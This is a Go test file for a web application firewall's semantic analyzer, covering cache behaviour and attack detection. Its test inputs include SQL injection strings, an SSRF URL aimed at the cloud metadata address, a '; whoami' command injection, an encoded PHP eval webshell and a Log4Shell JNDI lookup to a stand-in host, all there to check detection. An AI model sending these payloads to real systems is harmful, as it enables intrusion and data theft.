package semantic

import (
	"context"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
)

func TestCandidateCacheHitAndTTL(t *testing.T) {
	processCandidateCache.resetForTest()
	ProcessMetrics().ResetForTest()
	c := newCandidateCache(8, time.Minute)
	key := candidateCacheKey("block", enabledCategoryFingerprint(map[string]bool{"sqli": true}), "query", "q", "1 union select 1")
	if _, ok := c.get(key); ok {
		t.Fatal("expected miss")
	}
	c.put(key, []Hit{{Category: "sqli", Payload: "1 union select 1", Confidence: 0.9}})
	got, ok := c.get(key)
	if !ok || len(got) != 1 || got[0].Category != "sqli" {
		t.Fatalf("expected cache hit, got ok=%v hits=%+v", ok, got)
	}

	shard := c.shard(key)
	shard.mu.Lock()
	entry := shard.items[key]
	entry.expires = time.Now().Add(-time.Nanosecond).UnixNano()
	shard.items[key] = entry
	shard.mu.Unlock()

	if _, ok := c.get(key); ok {
		t.Fatal("expected TTL expiry miss")
	}
}

func TestCacheTTLJitterBoundsAreSymmetric(t *testing.T) {
	ttl := 80 * time.Second
	jitter := ttl / 8
	tests := []struct {
		name   string
		sample int64
		want   time.Duration
	}{
		{name: "lower bound", sample: 0, want: ttl - jitter},
		{name: "configured TTL", sample: int64(jitter), want: ttl},
		{name: "upper bound", sample: int64(2 * jitter), want: ttl + jitter},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := cacheTTLWithJitter(ttl, tc.sample); got != tc.want {
				t.Fatalf("cache TTL with jitter = %s, want %s", got, tc.want)
			}
		})
	}
}

func TestCandidateCacheKeyIncludesFieldContext(t *testing.T) {
	fingerprint := enabledCategoryFingerprint(map[string]bool{"ssrf": true})
	text := "http://169.254.169.254/latest/meta-data"
	plain := candidateCacheKey("block", fingerprint, "query", "note", text)
	fetchSink := candidateCacheKey("block", fingerprint, "query", "url", text)
	header := candidateCacheKey("block", fingerprint, "header", "url", text)
	if plain == fetchSink || fetchSink == header || plain == header {
		t.Fatal("cache key must partition source and parameter-name-sensitive analysis")
	}
}

func TestEnabledCategoryFingerprintIncludesEveryAnalyzerCategory(t *testing.T) {
	empty := enabledCategoryFingerprint(nil)
	webshell := enabledCategoryFingerprint(map[string]bool{"webshell": true})
	log4shell := enabledCategoryFingerprint(map[string]bool{"log4shell": true})
	if empty == webshell || empty == log4shell || webshell == log4shell {
		t.Fatal("webshell and log4shell must participate in cache policy partitioning")
	}
}

func TestAnalyzerCacheCannotReuseNonSinkSSRFResult(t *testing.T) {
	processCandidateCache.resetForTest()
	a := NewAnalyzer("block", 2, "ssrf")
	target := "http://169.254.169.254/latest/meta-data"

	plainReq, _ := http.NewRequest(http.MethodGet, "/proxy?note="+target, nil)
	plainCtx, err := engine.NewRequestContext(plainReq, "default")
	if err != nil {
		t.Fatal(err)
	}
	if result, err := a.Detect(context.Background(), plainCtx); err != nil || result != nil {
		t.Fatalf("non-fetch field should not block, result=%+v err=%v", result, err)
	}

	sinkReq, _ := http.NewRequest(http.MethodGet, "/proxy?url="+target, nil)
	sinkCtx, err := engine.NewRequestContext(sinkReq, "default")
	if err != nil {
		t.Fatal(err)
	}
	result, err := a.Detect(context.Background(), sinkCtx)
	if err != nil || result == nil || result.Category != "ssrf" {
		t.Fatalf("fetch sink must not reuse the non-sink cache entry, result=%+v err=%v", result, err)
	}
}

func TestGuardedMatchScansPastTwoKiB(t *testing.T) {
	text := strings.Repeat("a", 3<<10) + " select password from users"
	if !guardedMatchString2K(sqlSelectFrom, text) {
		t.Fatal("guarded regex must inspect attacks after the old 2 KiB cutoff")
	}
}

func TestRawBodyInputIsBounded(t *testing.T) {
	body := []byte(strings.Repeat("x", maxInputRawBytes+1024))
	req, _ := http.NewRequest(http.MethodPost, "/upload", nil)
	inputs := bodyInputs(req, body)
	if len(inputs) != 1 || inputs[0].Source != "body.raw" {
		t.Fatalf("expected one raw body input, got %+v", inputs)
	}
	if got := len(inputs[0].Raw); got != maxInputRawBytes {
		t.Fatalf("raw body input length = %d, want %d", got, maxInputRawBytes)
	}
}

func TestLargeCandidatesAreNotRetainedInProcessCache(t *testing.T) {
	processCandidateCache.resetForTest()
	a := NewAnalyzer("block", 2, "rce")
	candidate := semanticCandidate{
		input: InputPoint{Source: "query", Name: "cmd"},
		text:  strings.Repeat("a", maxCacheableCandidateBytes+1) + "; whoami",
	}
	if hits := a.analyzeCandidate(candidate); len(hits) == 0 {
		t.Fatal("test candidate must exercise a positive analysis path")
	}
	if hits, misses := processCandidateCache.stats(); hits != 0 || misses != 0 {
		t.Fatalf("large candidate touched process cache: hits=%d misses=%d", hits, misses)
	}
}

func TestAnalyzerBlocksDedicatedWebshellAndLog4ShellCategories(t *testing.T) {
	tests := []struct {
		name     string
		category string
		target   string
	}{
		{
			name:     "php webshell",
			category: "webshell",
			target:   "/upload?payload=%3C%3Fphp%20eval(%24_POST%5B%27cmd%27%5D)%3B%20%3F%3E",
		},
		{
			name:     "log4shell jndi",
			category: "log4shell",
			target:   "/lookup?value=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			processCandidateCache.resetForTest()
			req, _ := http.NewRequest(http.MethodGet, tc.target, nil)
			reqCtx, err := engine.NewRequestContext(req, "default")
			if err != nil {
				t.Fatal(err)
			}
			result, err := NewAnalyzer("block", 2, tc.category).Detect(context.Background(), reqCtx)
			if err != nil || result == nil || result.Category != tc.category || result.Action != engine.ActionBlock {
				t.Fatalf("dedicated %s analyzer did not block: result=%+v err=%v", tc.category, result, err)
			}
		})
	}
}

func TestAnalyzerParallelCandidatesStillDetect(t *testing.T) {
	processCandidateCache.resetForTest()
	a := NewAnalyzer("block", 2)
	// Multiple fields so worker pool engages; one is classic SQLi.
	body := `{"q1":"hello","q2":"world","q3":"theme","q4":"1 union select password from users--","q5":"ok","q6":"fine"}`
	req, _ := http.NewRequest(http.MethodPost, "/api/search", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	reqCtx, err := engine.NewRequestContext(req, "default")
	if err != nil {
		t.Fatal(err)
	}
	res, err := a.Detect(context.Background(), reqCtx)
	if err != nil || res == nil || !res.Detected || res.Category != "sqli" {
		t.Fatalf("expected parallel multi-field sqli detection, got %+v err=%v", res, err)
	}
}

func TestAnalyzerCandidateCacheSpeedsRepeatedFields(t *testing.T) {
	processCandidateCache.resetForTest()
	ProcessMetrics().ResetForTest()
	a := NewAnalyzer("block", 2, "sqli", "xss", "rce", "lfi", "xxe", "ssrf", "nosqli", "ssti")
	req, _ := http.NewRequest(http.MethodGet, "/search?q=selecting+a+theme+for+dashboard", nil)
	reqCtx, err := engine.NewRequestContext(req, "default")
	if err != nil {
		t.Fatal(err)
	}
	// Warm cache with clean traffic.
	for i := 0; i < 3; i++ {
		reqCtx.Metadata = map[string]any{}
		if _, err := a.Detect(context.Background(), reqCtx); err != nil {
			t.Fatal(err)
		}
	}
	snap := ProcessMetrics().Snapshot()
	if snap.CacheHits == 0 {
		t.Fatalf("expected cache hits after repeated clean requests, got hits=%d misses=%d", snap.CacheHits, snap.CacheMisses)
	}
	// Attack payload should still detect (and cache hit on repeat).
	req2, _ := http.NewRequest(http.MethodGet, "/search?q=1%20union%20select%20password%20from%20users", nil)
	ctx2, err := engine.NewRequestContext(req2, "default")
	if err != nil {
		t.Fatal(err)
	}
	res1, err := a.Detect(context.Background(), ctx2)
	if err != nil || res1 == nil || !res1.Detected || res1.Category != "sqli" {
		t.Fatalf("expected sqli detection, got %+v err=%v", res1, err)
	}
	ctx2.Metadata = map[string]any{}
	res2, err := a.Detect(context.Background(), ctx2)
	if err != nil || res2 == nil || !res2.Detected {
		t.Fatalf("expected cached sqli detection, got %+v err=%v", res2, err)
	}
}
